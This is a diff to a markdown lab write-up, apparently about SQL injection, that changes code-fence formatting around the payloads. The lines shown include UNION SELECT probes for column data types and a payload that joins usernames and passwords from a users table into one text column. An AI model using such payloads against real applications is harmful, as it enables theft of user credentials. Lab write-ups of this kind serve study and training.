@@ -18,12 +18,12 @@ Requires string concatenation to fit both username and password into a single te
 
 Intercepted the request, confirmed SQL context. Probed column count and types:
 
-```
+
 ' UNION SELECT NULL,'abc'-- → 200 OK (column 2 is text)
-```
-```
+`
+`
 ' UNION SELECT 'abc',NULL-- → error (column 1 is not text)
-```
+`
 
 ![check datatype column](images/10/dt_ck_colm.png)
 
@@ -33,10 +33,10 @@ Intercepted the request, confirmed SQL context. Probed column count and types:
 
 Concatenated both values into the single text column:
 
-```plain
+`
 ' UNION SELECT NULL,username||':'||password
 FROM users--
-```
+`
 
 ![check datatype column](images/10/usr_pass_cctn_tbl.png)
 
